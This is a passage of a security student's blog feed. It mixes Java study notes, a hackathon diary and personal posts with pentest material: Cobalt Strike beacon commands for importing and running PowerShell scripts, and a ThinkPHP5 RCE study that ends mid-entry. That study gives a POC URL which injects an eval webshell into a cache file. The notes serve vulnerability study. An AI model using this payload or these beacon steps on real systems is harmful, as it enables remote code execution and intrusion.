class="line">&#125;</span><br></pre></td></tr></table></figure><p>🐂🍺</p><ul><li>子类可以覆写父类的方法（Override），覆写在子类中改变了父类方法的行为；</li><li>Java的方法调用总是作用于运行期对象的实际类型，这种行为称为多态；</li><li><code>final</code>修饰符有多种作用：<ul><li><code>final</code>修饰的方法可以阻止被覆写；</li><li><code>final</code>修饰的class可以阻止被继承；</li><li><code>final</code>修饰的field必须在创建对象时初始化，随后不可修改。</li></ul></li></ul><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><p>如果父类的方法本身不需要实现任何功能，仅仅是为了定义方法签名，目的是让子类去覆写它，那么，可以把父类的方法声明为抽象方法：</p><p>面向抽象编程的本质就是：</p><ul><li>上层代码只定义规范（例如：<code>abstract class Person</code>）；</li><li>不需要子类就可以实现业务逻辑（正常编译）；</li><li>具体的业务逻辑由不同的子类实现，调用者并不关心。</li></ul><ul><li>通过<code>abstract</code>定义的方法是抽象方法，它只有定义，没有实现。抽象方法定义了子类必须实现的接口规范；</li><li>定义了抽象方法的class必须被定义为抽象类，从抽象类继承的子类必须实现抽象方法；</li><li>如果不实现抽象方法，则该子类仍是一个抽象类；</li><li>面向抽象编程使得调用者只关心抽象方法的定义，不关心子类的具体实现。</li></ul><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>Java的接口特指<code>interface</code>的定义，表示一个接口类型和一组方法签名，而编程接口泛指接口规范，如方法签名，数据格式，网络协议等。</p><p>抽象类和接口的对比如下：</p><table><thead><tr><th align="left"></th><th align="left">abstract class</th><th align="left">interface</th></tr></thead><tbody><tr><td align="left">继承</td><td align="left">只能extends一个class</td><td align="left">可以implements多个interface</td></tr><tr><td align="left">字段</td><td align="left">可以定义实例字段</td><td align="left">不能定义实例字段</td></tr><tr><td align="left">抽象方法</td><td align="left">可以定义抽象方法</td><td align="left">可以定义抽象方法</td></tr><tr><td align="left">非抽象方法</td><td align="left">可以定义非抽象方法</td><td align="left">可以定义default方法</td></tr></tbody></table><h2 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h2><p>一个<code>interface</code>可以继承自另一个<code>interface</code>。<code>interface</code>继承自<code>interface</code>使用<code>extends</code>，它相当于扩展了接口的方法。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，<code>Person</code>接口继承自<code>Hello</code>接口，因此，<code>Person</code>接口现在实际上有3个抽象方法签名，其中一个来自继承的<code>Hello</code>接口。</p><p>Java的接口（interface）定义了纯抽象规范，一个类可以实现多个接口；</p><p>接口也是数据类型，适用于向上转型和向下转型；</p><p>接口的所有方法都是抽象方法，接口不能定义实例字段；</p><p>接口可以定义<code>default</code>方法（JDK&gt;=1.8）。</p><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>Java 中，通过包来解决名称冲突的问题。在Java中，我们使用<code>package</code>来解决名字冲突。</p><p>在Java虚拟机执行的时候，JVM只看完整类名，因此，只要包名不同，类就不同。</p><p>包可以是多层结构，用<code>.</code>隔开。例如：<code>java.util</code>。</p><blockquote><p>要特别注意：包没有父子关系。java.util和java.util.zip是不同的包，两者没有任何继承关系。</p></blockquote><p>我们还需要按照包结构把上面的Java文件组织起来。假设以<code>package_sample</code>作为根目录，<code>src</code>作为源码目录，那么所有文件结构就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">└─ src</span><br><span class="line">    ├─ hong</span><br><span class="line">    │  └─ Person.java</span><br><span class="line">    │  ming</span><br><span class="line">    │  └─ Person.java</span><br><span class="line">    └─ mr</span><br><span class="line">       └─ jun</span><br><span class="line">          └─ Arrays.java</span><br></pre></td></tr></table></figure><p>编译后的<code>.class</code>文件也需要按照包结构存放。如果使用IDE，把编译后的<code>.class</code>文件放到<code>bin</code>目录下，那么，编译的文件结构就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">└─ bin</span><br><span class="line">   ├─ hong</span><br><span class="line">   │  └─ Person.class</span><br><span class="line">   │  ming</span><br><span class="line">   │  └─ Person.class</span><br><span class="line">   └─ mr</span><br><span class="line">      └─ jun</span><br><span class="line">         └─ Arrays.class</span><br></pre></td></tr></table></figure><p>编译的命令相对比较复杂，我们需要在<code>src</code>目录下执行<code>javac</code>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d ..&#x2F;bin ming&#x2F;Person.java hong&#x2F;Person.java mr&#x2F;jun&#x2F;Arrays.java</span><br></pre></td></tr></table></figure><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>在Java中，我们经常看到<code>public</code>、<code>protected</code>、<code>private</code>这些修饰符。在Java中，这些修饰符可以用来限定访问作用域。</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>在方法内部定义的变量称为局部变量，局部变量作用域从变量声明处开始到对应的块结束。方法参数也是局部变量。</p><p>如果不确定是否需要<code>public</code>，就不声明为<code>public</code>，即尽可能少地暴露对外的字段和方法。</p><p>把方法定义为<code>package</code>权限有助于测试，因为测试类和被测试类只要位于同一个<code>package</code>，测试代码就可以访问被测试类的<code>package</code>权限方法。</p><p>一个<code>.java</code>文件只能包含一个<code>public</code>类，但可以包含多个非<code>public</code>类。如果有<code>public</code>类，文件名必须和<code>public</code>类的名字相同。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Java内建的访问权限包括<code>public</code>、<code>protected</code>、<code>private</code>和<code>package</code>权限；</p><p>Java在方法内部定义的变量是局部变量，局部变量的作用域从变量声明开始，到一个块结束；</p><p><code>final</code>修饰符不是访问权限，它可以修饰<code>class</code>、<code>field</code>和<code>method</code>；</p><p>一个<code>.java</code>文件只能包含一个<code>public</code>类，但可以包含多个非<code>public</code>类。</p><h1 id="classpath-jar"><a href="#classpath-jar" class="headerlink" title="classpath \ jar"></a>classpath \ jar</h1><h2 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h2><p><code>classpath</code>是JVM用到的一个环境变量，它用来指示JVM如何搜索<code>class</code>。</p><p>因为Java是编译型语言，源码文件是<code>.java</code>，而编译后的<code>.class</code>文件才是真正可以被JVM执行的字节码。因此，JVM需要知道，如果要加载一个<code>abc.xyz.Hello</code>的类，应该去哪搜索对应的<code>Hello.class</code>文件。</p><p>所以，<code>classpath</code>就是一组目录的集合，它设置的搜索路径与操作系统相关。例如，在Windows系统上，用<code>;</code>分隔，带空格的目录用<code>&quot;&quot;</code>括起来，可能长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\work\project1\bin;C:\shared;&quot;D:\My Documents\project1\bin&quot;</span><br></pre></td></tr></table></figure><p>在Linux系统上，用<code>:</code>分隔，可能长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;shared:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;home&#x2F;liaoxuefeng&#x2F;bin</span><br></pre></td></tr></table></figure><p>现在我们假设<code>classpath</code>是<code>.;C:\work\project1\bin;C:\shared</code>，当JVM在加载<code>abc.xyz.Hello</code>这个类时，会依次查找：</p><ul><li>&lt;当前目录&gt;\abc\xyz\Hello.class</li><li>C:\work\project1\bin\abc\xyz\Hello.class</li><li>C:\shared\abc\xyz\Hello.class</li></ul><p>注意到<code>.</code>代表当前目录。如果JVM在某个路径下找到了对应的<code>class</code>文件，就不再往后继续搜索。如果所有路径下都没有找到，就报错。</p><p><code>classpath</code>的设定方法有两种：</p><p>在系统环境变量中设置<code>classpath</code>环境变量，不推荐；</p><p>在启动JVM时设置<code>classpath</code>变量，推荐。</p><p>我们强烈<em>不推荐</em>在系统环境变量中设置<code>classpath</code>，那样会污染整个系统环境。在启动JVM时设置<code>classpath</code>才是推荐的做法。实际上就是给<code>java</code>命令传入<code>-classpath</code>或<code>-cp</code>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -classpath .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>或者使用<code>-cp</code>的简写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>没有设置系统环境变量，也没有传入<code>-cp</code>参数，那么JVM默认的<code>classpath</code>为<code>.</code>，即当前目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java abc.xyz.Hello</span><br></pre></td></tr></table></figure><h2 id="jar包"><a href="#jar包" class="headerlink" title="jar包"></a>jar包</h2><p>如果有很多<code>.class</code>文件，散落在各层目录中，肯定不便于管理。如果能把目录打一个包，变成一个文件，就方便多了。</p><p>jar包就是用来干这个事的，它可以把<code>package</code>组织的目录层级，以及各个目录下的所有文件（包括<code>.class</code>文件和其他文件）都打成一个jar文件，这样一来，无论是备份，还是发给客户，就简单多了。</p><p>jar包实际上就是一个zip格式的压缩文件，而jar包相当于目录。如果我们要执行一个jar包的<code>class</code>，就可以把jar包放到<code>classpath</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .&#x2F;hello.jar abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>这样JVM会自动在<code>hello.jar</code>文件里去搜索某个类。</p><p>jar包还可以包含一个特殊的<code>/META-INF/MANIFEST.MF</code>文件，<code>MANIFEST.MF</code>是纯文本，可以指定<code>Main-Class</code>和其它信息。JVM会自动读取这个<code>MANIFEST.MF</code>文件，如果存在<code>Main-Class</code>，我们就不必在命令行指定启动的类名，而是用更方便的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar hello.jar</span><br></pre></td></tr></table></figure><hr><p>当然，肯定用 maven 这个命令来打包jar 包啦。</p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp app.jar:a.jar:b.jar:c.jar com.liaoxuefeng.sample.Main</span><br></pre></td></tr></table></figure><p>如果漏写了某个运行时需要用到的jar，那么在运行期极有可能抛出<code>ClassNotFoundException</code>。</p><p>所以，jar只是用于存放class的容器，它并不关心class之间的依赖。</p><p>从Java 9开始引入的模块，主要是为了解决“依赖”这个问题。如果<code>a.jar</code>必须依赖另一个<code>b.jar</code>才能运行，那我们应该给<code>a.jar</code>加点说明啥的，让程序在编译和运行的时候能自动定位到<code>b.jar</code>，这种自带“依赖关系”的class容器就是模块。</p><h1 id="Java-上机实验Last-one"><a href="#Java-上机实验Last-one" class="headerlink" title="Java 上机实验Last one"></a>Java 上机实验Last one</h1><h2 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h2><h2 id="多态-1"><a href="#多态-1" class="headerlink" title="多态"></a>多态</h2><h2 id="抽象类-1"><a href="#抽象类-1" class="headerlink" title="抽象类"></a>抽象类</h2><h2 id="接口-1"><a href="#接口-1" class="headerlink" title="接口"></a>接口</h2>]]></content>
    
    
    <summary type="html">记录一些Java知识</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
    <category term="作业" scheme="https://hack-for.fun/tags/%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>代码审计实战(闪灵CMS企业建站系统 5.0)</title>
    <link href="https://hack-for.fun/d237.html"/>
    <id>https://hack-for.fun/d237.html</id>
    <published>2020-11-08T06:57:43.000Z</published>
    <updated>2020-11-08T09:13:54.472Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a59e1509495dbd215ed9c4c25b27a720334502a5759258d81cb1cacc187ac382"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Chrome 浏览器扩展开发初试</title>
    <link href="https://hack-for.fun/62d1.html"/>
    <id>https://hack-for.fun/62d1.html</id>
    <published>2020-11-07T05:04:25.000Z</published>
    <updated>2020-11-08T05:43:39.809Z</updated>
    
    <content type="html"><![CDATA[<p>Junction 2020 ,我们队伍选择了开发浏览器拓展，我负责写前端。</p><p>但是后面直接自闭咯，就我和Cyz在搞。<strong>队伍分工形如虚设。</strong> </p><a id="more"></a><p>第一次参加“开发”类型的比赛，以主动放弃告终。</p><h1 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h1><p>思维导图：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107164417.png" alt="image-20201107164415731"></p><p>文件夹目录树：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107145226.png" alt="image-20201107144757481"></p><p>hello.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Junction Shop 2020<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        aaa</span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>manifest.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Junction 2020 Connected Shop&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span> : <span class="string">&quot;Junction Shop&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;manifest_version&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;browser_action&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;default_popup&quot;</span>: <span class="string">&quot;hello.html&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;default_icon&quot;</span>: <span class="string">&quot;apple-touch-icon.png&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;commands&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;_execute_browser_action&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;suggested_key&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;default&quot;</span>: <span class="string">&quot;Ctrl+Shift+O&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;mac&quot;</span>: <span class="string">&quot;Command+Shift+O&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Opens hello.html&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107145313.png" alt="image-20201107145132902"></p><p>这个效果只是一个没有任何功能的HTML前端罢了。</p><p>然后我打算加一些第三方浏览器框架。Google 上找到了这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;EmailThis&#x2F;extension-boilerplate.git</span><br></pre></td></tr></table></figure><hr><p>Cyz也和队友沟通，队友无响应。就各自干各自的。就和第二季度的时候，打CTF差不多，又要报名，来了又不打。</p><p>我看前面那排队伍，做的挺好的。虽然是到处趴的，但是这也是一种能力啊 - - 。分工明确，谁去网上找source code，找样例，谁负责ppt，谁负责流程图，谁负责英文校对。。。</p><hr><p>哈哈，人不能啥都想要 - -。但是能从一件事情中学到自己的不足就，然后后面去不断改善吧~</p><p><strong>自己的开发能力为0，平时多提升下代码基础</strong></p><p><a href="https://shimo.im/docs/CQyrChjWQwdRHt3c/">https://shimo.im/docs/CQyrChjWQwdRHt3c/</a></p>]]></content>
    
    
    <summary type="html">第一次参加“开发”类型的比赛，以主动放弃告终。</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="https://hack-for.fun/558a.html"/>
    <id>https://hack-for.fun/558a.html</id>
    <published>2020-11-04T13:33:44.000Z</published>
    <updated>2020-11-04T15:33:14.631Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些关于cs的东西~</p><h1 id="CS-派生-MSF"><a href="#CS-派生-MSF" class="headerlink" title="CS 派生 MSF"></a>CS 派生 MSF</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104225034.png" alt="image-20201104213742247"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104233130.png" alt="image-20201104213816240"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213842.png" alt="image-20201104213839479"></p><h1 id="通过powershell来增强cs的实用性"><a href="#通过powershell来增强cs的实用性" class="headerlink" title="通过powershell来增强cs的实用性"></a>通过powershell来增强cs的实用性</h1><h2 id="在beacon-shell中导入外部ps脚本到远程机器上"><a href="#在beacon-shell中导入外部ps脚本到远程机器上" class="headerlink" title="在beacon shell中导入外部ps脚本到远程机器上"></a>在beacon shell中导入外部ps脚本到远程机器上</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;root&#x2F;test.ps1 &#x2F;&#x2F;导入各种powershell脚本，这里可以导入nishang模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell  posershell脚本名</span><br></pre></td></tr></table></figure><h2 id="在beacon-shell中直接执行powershell代码"><a href="#在beacon-shell中直接执行powershell代码" class="headerlink" title="在beacon shell中直接执行powershell代码"></a>在beacon shell中直接执行powershell代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-Host</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213434.png" alt="image-20201104213433262"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一些关于cs的东西~&lt;/p&gt;
&lt;h1 id=&quot;CS-派生-MSF&quot;&gt;&lt;a href=&quot;#CS-派生-MSF&quot; class=&quot;headerlink&quot; title=&quot;CS 派生 MSF&quot;&gt;&lt;/a&gt;CS 派生 MSF&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="渗透工具" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2020小组招新有感</title>
    <link href="https://hack-for.fun/abc8.html"/>
    <id>https://hack-for.fun/abc8.html</id>
    <published>2020-10-23T16:56:04.000Z</published>
    <updated>2020-11-07T15:13:03.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。</p></blockquote><p>在这里，我以道格19级成员的身份，写一篇感受吧。</p><p>感受最深的，其实就是一个团体、一个组织，一定要有团结力、凝聚力。大家都一心往小组的未来发展考虑，有什么事大家一起分工协作，有难题大家一起想办法解决。</p><p>当然，这个过程中也有不好的体验。一个团体，不免会有出现划水的情况，部分师傅不够积极也是能够直接感受到的，但是不能说不好，毕竟这个感受是通过和其他团体成员比较得出的感受，不针对个人。</p><p>从谋划招新计划、到招新摆摊、申请宣讲会教室。两个管理小姐姐、<a href="http://xun9er.com/">Xun9er</a> 、和小帅锅，和学校层面、学校社团方面，还是有过不少的对线，也很辛苦。</p><p>招新摆摊那两天、老是下着小雨、第一天人还可算多、第二天人就慢慢少起来了。不过是新生少了，我们的人也少了。确实， 我们每天的事也挺多了，也不能把所有精力投入到招新工作中。蚊子多、湿冷。最后一晚上、搬离设施的时候、就来了4-5个小伙伴。</p><p>好在拉了个小群，也就10 个人在里面，活跃的也不过就3-4个人。里面还是有2-3个学弟我认为还比较可以，希望他们能够努力学习、通过考核。</p><p>宣讲会上，第一次感觉一个小组在一起办事、真的会方便很多。也拍了拍合照，也算是第一次拍正式合照了。</p><p>宣讲会，问了下学弟的评价，还算可以。会上，我也听到大家都笑了，这就对了。</p><p>最后，继续野蛮生长吧。我们还有很长的路要走，未来的发展，离不开每一个成员的努力，CTF排名、SRC挖洞、CVE、CNVD、大厂offer，是我们每个人奋斗的目标。</p><p>对了，我们不光只会搞技术， 我们也是很活泼开朗可爱的一群人呀！</p><p>照片就不放了，哈哈。想看加我微信或者QQ吧。</p><ul><li>博文删除密码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020年11月 7日 星期六 23时12分37秒 CST</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这里，我以道格19级成员的身份，写一篇感受吧。&lt;/p&gt;
&lt;p&gt;感受最深的，其实就</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 如何修改账户名</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>然后之前一直想修改，但是哪里是灰色的，无法修改。</p><p>修改后：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>修改方法：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>点击锁，输入密码之后就可以进行操作了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>然后点击 + 号，新建一个管理员用户。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>退出当前登录的用户（也是因为当前这个用户是处于登录状态，所以无法直接修改account name。</li><li>登录创建的test 管理员账号，直接跳过Apple ID 之类的设置，然后去修改account name。</li><li>切换回来就OK了。</li><li>删除创建的test 管理员用户。</li></ul><p>原来这样简单。</p><blockquote><p>其实很多事情，或许都简单，只是在于自己愿不愿意去做。</p></blockquote><p>最近也是心神不定的，好好学习嘛！Docker 逃逸好几种方法都没复现成功，淦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考资料：</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-利用缓存文件GetShell从而RCE"><a href="#RCE1-利用缓存文件GetShell从而RCE" class="headerlink" title="RCE1(利用缓存文件GetShell从而RCE)"></a>RCE1(利用缓存文件GetShell从而RCE)</h1><p>相关参考资料：<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 <code>.php</code> 文件中，攻击者通过精心构造的 <strong>payload</strong> ，即可将 <strong>webshell</strong> 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 <strong>远程代码执行漏洞</strong> 